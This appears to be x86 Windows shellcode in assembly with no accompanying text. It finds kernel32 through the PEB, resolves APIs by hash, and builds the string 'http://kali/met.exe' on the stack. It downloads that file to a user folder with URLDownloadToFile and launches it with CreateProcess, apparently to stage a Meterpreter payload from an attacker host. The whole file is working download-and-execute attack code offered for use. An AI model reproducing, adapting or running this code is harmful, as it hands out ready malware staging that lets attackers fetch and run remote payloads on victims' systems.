start: 
  mov ebp, esp ;
  add esp, 0xfffffcf0 ;

find_kernel32:
  xor ecx, ecx ;
  mov esi,fs:[ecx+30h] ;
  mov esi,[esi+0Ch] ;
  mov esi,[esi+1Ch] ;

next_module:
  mov ebx, [esi+8h] ;
  mov edi, [esi+20h] ;
  mov esi, [esi] ;
  cmp [edi+12*2], cx ;
  jne next_module ;

find_function_shorten:
  jmp find_function_shorten_bnc ;

find_function_ret:
  pop esi ;
  mov [ebp+0x04], esi ;
  jmp resolve_symbols_kernel32 ;

find_function_shorten_bnc:
  call find_function_ret ;

find_function:
  pushad ;
  mov eax, [ebx+0x3c] ;
  mov edi, [ebx+eax+0x78] ;
  add edi, ebx ;
  mov ecx, [edi+0x18] ;
  mov eax, [edi+0x20] ;
  add eax, ebx ;
  mov [ebp-4], eax ;

find_function_loop: 
  jecxz find_function_finished ;
  dec ecx ;
  mov eax, [ebp-4] ;
  mov esi, [eax+ecx*4] ;
  add esi, ebx ;
compute_hash: 
  xor eax, eax ;
  cdq ;
  cld ;

compute_hash_again: 
  lodsb ;
  test al, al ;
  jz compute_hash_finished ;
  ror edx, 0x0d ;
  add edx, eax ;
  jmp compute_hash_again ;

compute_hash_finished: 

find_function_compare: 
  cmp edx, [esp+0x24] ;
  jnz find_function_loop ;
  mov edx, [edi+0x24] ;
  add edx, ebx ;
  mov cx, [edx+2*ecx] ;
  mov edx, [edi+0x1c] ;
  add edx, ebx ;
  mov eax, [edx+4*ecx] ;
  add eax, ebx ;
  mov [esp+0x1c], eax ;

find_function_finished: 
  popad ;
  ret ;

resolve_symbols_kernel32: 
  push 0x78b5b983 ;
  call dword ptr [ebp+0x04] ;
  mov [ebp+0x14], eax ;
  push 0x75da1966 ;
  call dword ptr [ebp+0x04] ;
  mov [ebp+0x18], eax ;
  push 0x16b3fe72 ;
  call dword ptr [ebp+0x04] ;
  mov [ebp+0x1C], eax ;
  push 0xec0e4e8e ;
  call dword ptr [ebp+0x04] ;
  mov [ebp+0x20], eax ;

load_shell32: 
  xor eax, eax ;
  xor ecx, ecx ;
  mov eax, 0x076c6c65 ;
  mov ecx, 0xf8ffffff ;
  add eax, ecx ;
  push eax ;
  push 0x2e32336c ;
  push 0x6c656853 ;
  push esp ;
  call dword ptr [ebp+0x20] ;

resolve_shgetfolderpatha: 
  mov ebx, eax ;
  push 0x3745c867 ;
  call dword ptr [ebp+0x04] ;
  mov [ebp+0x24], eax ;

load_URLMon: 
  xor eax, eax ;
  mov eax, 0x6c6c ;
  push eax ;
  push 0x642e6e6f ; ;
  push 0x6d6c7255 ;
  push esp ;
  call dword ptr [ebp+0x20] ;

resolve_urldownloadtofile: 
  mov ebx, eax ;
  push 0x702f1a36 ;
  call dword ptr [ebp+0x04] ;
  mov [ebp+0x28], eax ;

load_shlwapi.dll: 
  push 0x6c6c64 ;
  push 0x2e697061 ;
  push 0x776c6853 ;
  push esp ;
  call dword ptr [ebp+0x20] ;

resolve_pathappend: 
  mov ebx, eax ;
  push 0x422e310e ;
  call dword ptr [ebp+0x04] ;
  mov [ebp+0x2c], eax ;

getfolder: 
  xor eax, eax ;
  lea eax, [ebp+0x70] ;
  push eax ;
  xor eax, eax ;
  push eax ;
  push eax ;
  push 0x10 ;
  push eax ;
  call dword ptr [ebp+0x24] ;

appendpath: 
  xor eax, eax ;
  push eax ;
  push 0x6578652e ;
  push 0x74656d5c ;
  push esp ;
  xor eax, eax ;
  lea eax, [ebp+0x70] ;
  push eax ;
  call dword ptr [ebp+0x2c] ;

metdownload_url: 
  xor eax, eax ;
  xor ecx, ecx ;
  mov eax, 0x07657866 ;
  mov ecx, 0xf8ffffff ;
  add eax, ecx ;
  push eax ;
  push 0x2e74656d ;
  push 0x2f696c61 ;
  push 0x6b2f2f3a ;
  push 0x70747468 ;
  mov ebx, esp ;

downloadmetfile: 
  xor eax, eax ;
  push eax ;
  push eax ;
  xor edi, edi ;
  lea edi, dword ptr [ebp+0x70] ;
  push edi ;
  push ebx ;
  push eax ;
  call dword ptr [ebp+0x28] ;

create_startupinfo: 
  xor eax, eax ;
  push eax ;
  push eax ;
  push eax ;
  push eax ;
  push eax ;
  mov al, 0x80 ;
  xor ecx, ecx ;
  mov cx, 0x80 ;
  add eax, ecx ;
  push eax ;
  xor eax, eax ;
  push eax ;
  push eax ;
  push eax ;
  push eax ;
  push eax ;
  push eax ;
  push eax ;
  push eax ;
  push eax ;
  push eax ;
  mov al, 0x44 ;
  push eax ;
  push esp ;
  pop edi ;

create_process: 
  mov eax, esp ;
  xor ecx, ecx ;
  mov cx, 0x390 ;
  sub eax, ecx ;
  push eax ;
  push edi ;
  xor eax, eax ;
  push eax ;
  push eax ;
  push eax ;
  inc eax ;
  push eax ;
  dec eax ;
  push eax ;
  push eax ;
  lea eax, dword ptr [ebp+0x70] ;
  push eax ;
  xor eax, eax ;
  push eax ;
  call dword ptr [ebp+0x1c] ;

Last_Error: 
  call dword ptr [ebp+0x18] ;

exec_shellcode: 
  xor ecx, ecx ;
  push ecx ;
  push 0xffffffff ;
  call dword ptr [ebp+0x14] ;